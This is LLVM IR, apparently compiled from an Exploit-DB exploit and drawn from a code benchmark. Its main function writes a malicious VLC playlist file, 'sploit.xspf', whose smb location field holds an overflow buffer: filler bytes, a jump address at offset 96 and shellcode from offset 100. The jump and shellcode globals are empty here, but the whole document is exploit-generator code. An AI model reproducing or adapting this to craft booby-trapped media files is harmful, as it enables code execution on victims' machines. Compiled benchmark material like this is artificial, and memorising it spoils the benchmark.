; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_9303.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_9303.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [12 x i8] c"sploit.xspf\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.2 = private unnamed_addr constant [40 x i8] c"<?xml version=\221.0\22 encoding=\22UTF-8\22?>\0A\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"<playlist version=\221\22 xmlns=\22http://xspf.org/ns/0/\22 xmlns:vlc=\22http://www.videolan.org/vlc/playlist/ns/0/\22>\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"\09<title>Playlist</title>\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"\09<trackList>\0A\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"\09\09<track>\0A\00", align 1
@.str.7 = private unnamed_addr constant [54 x i8] c"\09\09\09<location>smb://example.com@www.example.com/foo/#{\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"[*] Creating buffer\0A\00", align 1
@jmp = common dso_local global i64 0, align 8
@shell = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"}</location>\0A\00", align 1
@.str.11 = private unnamed_addr constant [69 x i8] c"\09\09\09<extension application=\22http://www.videolan.org/vlc/playlist/0\22>\0A\00", align 1
@.str.12 = private unnamed_addr constant [24 x i8] c"\09\09\09\09<vlc:id>0</vlc:id>\0A\00", align 1
@.str.13 = private unnamed_addr constant [17 x i8] c"\09\09\09</extension>\0A\00", align 1
@.str.14 = private unnamed_addr constant [12 x i8] c"\09\09</track>\0A\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"\09</trackList>\0A\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"</playlist>\0A\00", align 1
@.str.17 = private unnamed_addr constant [41 x i8] c"[*] Exploit file written to sploit.xspf\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i64*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %11, i32** %8, align 8
  %12 = load i32*, i32** %8, align 8
  %13 = call i32 (i32*, i8*, ...) @fprintf(i32* %12, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.2, i64 0, i64 0))
  %14 = load i32*, i32** %8, align 8
  %15 = call i32 (i32*, i8*, ...) @fprintf(i32* %14, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i64 0, i64 0))
  %16 = load i32*, i32** %8, align 8
  %17 = call i32 (i32*, i8*, ...) @fprintf(i32* %16, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  %18 = load i32*, i32** %8, align 8
  %19 = call i32 (i32*, i8*, ...) @fprintf(i32* %18, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  %20 = load i32*, i32** %8, align 8
  %21 = call i32 (i32*, i8*, ...) @fprintf(i32* %20, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0))
  %22 = load i32*, i32** %8, align 8
  %23 = call i32 (i32*, i8*, ...) @fprintf(i32* %22, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.7, i64 0, i64 0))
  %24 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %9, align 4
  br label %25

25:                                               ; preds = %37, %2
  %26 = load i32, i32* %9, align 4
  %27 = icmp slt i32 %26, 300
  br i1 %27, label %28, label %40

28:                                               ; preds = %25
  %29 = load i32, i32* %9, align 4
  %30 = sdiv i32 %29, 4
  %31 = srem i32 %30, 26
  %32 = add nsw i32 97, %31
  %33 = trunc i32 %32 to i8
  %34 = load i32, i32* %9, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %35
  store i8 %33, i8* %36, align 1
  br label %37

37:                                               ; preds = %28
  %38 = load i32, i32* %9, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %9, align 4
  br label %25

40:                                               ; preds = %25
  %41 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %42 = getelementptr inbounds i8, i8* %41, i64 96
  %43 = bitcast i8* %42 to i64*
  store i64* %43, i64** %10, align 8
  %44 = load i64, i64* @jmp, align 8
  %45 = load i64*, i64** %10, align 8
  store i64 %44, i64* %45, align 8
  store i32 0, i32* %9, align 4
  br label %46

46:                                               ; preds = %61, %40
  %47 = load i32, i32* %9, align 4
  %48 = load i8*, i8** @shell, align 8
  %49 = call i32 @strlen(i8* %48)
  %50 = icmp slt i32 %47, %49
  br i1 %50, label %51, label %64

51:                                               ; preds = %46
  %52 = load i8*, i8** @shell, align 8
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = load i32, i32* %9, align 4
  %58 = add nsw i32 %57, 100
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %59
  store i8 %56, i8* %60, align 1
  br label %61

61:                                               ; preds = %51
  %62 = load i32, i32* %9, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %9, align 4
  br label %46

64:                                               ; preds = %46
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 300
  store i8 0, i8* %65, align 4
  %66 = load i32*, i32** %8, align 8
  %67 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  %68 = call i32 (i32*, i8*, ...) @fprintf(i32* %66, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %67)
  %69 = load i32*, i32** %8, align 8
  %70 = call i32 (i32*, i8*, ...) @fprintf(i32* %69, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0))
  %71 = load i32*, i32** %8, align 8
  %72 = call i32 (i32*, i8*, ...) @fprintf(i32* %71, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.11, i64 0, i64 0))
  %73 = load i32*, i32** %8, align 8
  %74 = call i32 (i32*, i8*, ...) @fprintf(i32* %73, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0))
  %75 = load i32*, i32** %8, align 8
  %76 = call i32 (i32*, i8*, ...) @fprintf(i32* %75, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.13, i64 0, i64 0))
  %77 = load i32*, i32** %8, align 8
  %78 = call i32 (i32*, i8*, ...) @fprintf(i32* %77, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.14, i64 0, i64 0))
  %79 = load i32*, i32** %8, align 8
  %80 = call i32 (i32*, i8*, ...) @fprintf(i32* %79, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0))
  %81 = load i32*, i32** %8, align 8
  %82 = call i32 (i32*, i8*, ...) @fprintf(i32* %81, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i64 0, i64 0))
  %83 = load i32*, i32** %8, align 8
  %84 = call i32 @fclose(i32* %83)
  %85 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.17, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
